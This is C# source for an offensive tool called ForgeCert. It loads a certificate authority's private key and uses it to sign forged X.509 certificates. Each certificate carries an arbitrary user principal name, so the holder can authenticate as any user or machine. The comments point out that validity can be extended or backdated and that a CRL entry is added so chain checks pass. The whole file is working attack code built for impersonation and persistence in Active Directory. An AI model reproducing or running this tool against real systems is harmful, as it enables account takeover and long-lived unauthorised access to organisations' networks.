using Org.BouncyCastle.Asn1.Pkcs;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Asn1.X9;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Operators;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using System;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using CommandLine;
using Org.BouncyCastle.Asn1;
using Org.BouncyCastle.Pkcs;
using Org.BouncyCastle.Utilities;
using X509Certificate = Org.BouncyCastle.X509.X509Certificate;

namespace ForgeCert
{
    internal class Program
    {
        private static readonly SecureRandom Random = new SecureRandom();

        private static void Main(string[] args)
        {
            var result = Parser.Default.ParseArguments<CommandLineOptions>(args);
            result.WithParsed<CommandLineOptions>(Start);

        }

        private static void Start(CommandLineOptions options)
        {
            var caKeyPair = ReadCaKey(options.CaKeyPath, options.CaKeyPassword);

            PrintCertInfo("CA Certificate Information:", caKeyPair.Certificate);

            var subjectKeyPair = GenerateRsaKeyPair(2048);
            var cert = GenerateCertificate(
                caKeyPair.Certificate.SubjectDN,
                options.Subject,
                options.SubjectAltName,
                caKeyPair,
                subjectKeyPair.Public,
                options.CRLPath
            );

            PrintCertInfo("\nForged Certificate Information:", cert);

            SaveToPfxFile(options.OutputCertPath, options.OutputCertPassword, cert, subjectKeyPair.Private);

            Console.WriteLine($"\nDone. Saved forged certificate to {options.OutputCertPath} with the password '{options.OutputCertPassword}'");
        }

        private static void PrintCertInfo(string header, X509Certificate cert)
        {
            var cert2 = new X509Certificate2(cert.GetEncoded());

            Console.WriteLine(header);
            Console.WriteLine($"  Subject:        {cert2.Subject}");

            var altName = cert2.GetNameInfo(X509NameType.UpnName, false);
            if (!string.IsNullOrEmpty(altName)) Console.WriteLine($"  SubjectAltName: {altName}");

            Console.WriteLine($"  Issuer:         {cert2.Issuer}");
            Console.WriteLine($"  Start Date:     {cert2.NotBefore}");
            Console.WriteLine($"  End Date:       {cert2.NotAfter}");
            Console.WriteLine($"  Thumbprint:     {cert2.Thumbprint}");
            Console.WriteLine($"  Serial:         {cert2.SerialNumber}");

        }

        private static void SaveToPfxFile(string filename, string password, X509Certificate cert, AsymmetricKeyParameter privateKey)
        {
            var store = new Pkcs12Store();
            var friendlyName = cert.SubjectDN.ToString();
            var certificateEntry = new X509CertificateEntry(cert);
            store.SetCertificateEntry(friendlyName, certificateEntry);
            store.SetKeyEntry(
                friendlyName,
                new AsymmetricKeyEntry(privateKey),
                new[] { certificateEntry }
            );

            var stream = new MemoryStream();
            store.Save(stream, password.ToCharArray(), Random);

            File.WriteAllBytes(filename, stream.ToArray());
        }

        private static AsymmetricCipherKeyPair GenerateRsaKeyPair(int length)
        {
            var keygenParam = new KeyGenerationParameters(Random, length);

            var keyGenerator = new RsaKeyPairGenerator();
            keyGenerator.Init(keygenParam);
            return keyGenerator.GenerateKeyPair();
        }

        private static X509Certificate GenerateCertificate(
            X509Name issuer, string subject, string subjectAltName,
            KeyPair issuerKeyPair,
            AsymmetricKeyParameter subjectPublic,
            string CRL = "")
        {
            ISignatureFactory signatureFactory;
            if (issuerKeyPair.Key is ECPrivateKeyParameters)
            {
                signatureFactory = new Asn1SignatureFactory(
                    X9ObjectIdentifiers.ECDsaWithSha256.ToString(),
                    issuerKeyPair.Key);
            }
            else
            {
                signatureFactory = new Asn1SignatureFactory(
                    PkcsObjectIdentifiers.Sha256WithRsaEncryption.ToString(),
                    issuerKeyPair.Key);
            }

            var certGenerator = new X509V3CertificateGenerator();
            certGenerator.SetIssuerDN(issuer);
            certGenerator.SetSubjectDN(new X509Name(subject));
            certGenerator.SetSerialNumber(BigIntegers.CreateRandomInRange(BigInteger.One, BigInteger.Two.Pow(128), Random));
            
            // Yes, the end lifetime can be changed easily, up to the lifetime of the CA certificate being used to forge
            certGenerator.SetNotAfter(DateTime.UtcNow.AddYears(1));
            
            // this can be changed as well to backdate
            certGenerator.SetNotBefore(DateTime.UtcNow);
            certGenerator.SetPublicKey(subjectPublic);

            // Subject Alternative Name - this is the user/machine we're actually forging the cert for
            var otherName = new Asn1EncodableVector
            {
                new DerObjectIdentifier("1.3.6.1.4.1.311.20.2.3"),
                new DerTaggedObject(
                    true,
                    GeneralName.OtherName,
                    new DerUtf8String(subjectAltName)
                )
            };
            Asn1Object upn = new DerTaggedObject(false, 0, new DerSequence(otherName));
            var generalNames = new Asn1EncodableVector { upn };

            certGenerator.AddExtension(
                X509Extensions.SubjectAlternativeName,
                false,
                new DerSequence(generalNames));


            // Authority Key Identifier - required
            certGenerator.AddExtension(
                X509Extensions.AuthorityKeyIdentifier,
                false,
                new AuthorityKeyIdentifier(
                    SubjectPublicKeyInfoFactory.CreateSubjectPublicKeyInfo(issuerKeyPair.Certificate.GetPublicKey())
                ));

            // A CRL is required for chain verification when using a subordinate CA certificate
            if (!String.IsNullOrEmpty(CRL))
            {
                // CRL Distribution Points
                var crlDistributionPoints = new DistributionPoint[1] {
                    new DistributionPoint(new DistributionPointName(
                        new GeneralNames(new GeneralName(GeneralName.UniformResourceIdentifier, CRL))), null, null),
                };
                var revocationListExtension = new CrlDistPoint(crlDistributionPoints);
                certGenerator.AddExtension(X509Extensions.CrlDistributionPoints, false, revocationListExtension);
            }

            return certGenerator.Generate(signatureFactory);
        }


        private static KeyPair ReadCaKey(string path, string password)
        {
            var cert = new FileStream(path, FileMode.Open, FileAccess.Read);
            var store = new Pkcs12Store(cert, password.ToCharArray());

            if (store.Count > 1)
            {
                throw new ArgumentException("CA store contains more than 1 key");
            }

            foreach (var e in store.Aliases)
            {
                var c = store.GetCertificate(e.ToString());
                var key = store.GetKey(e.ToString());

                return new KeyPair()
                {
                    Key = key.Key,
                    Certificate = c.Certificate
                };
            }

            throw new ArgumentException("CA store does not contain any keys");
        }

        public class KeyPair
        {
            public X509Certificate Certificate { get; set; }
            public AsymmetricKeyParameter Key { get; set; }
        }
    }
}
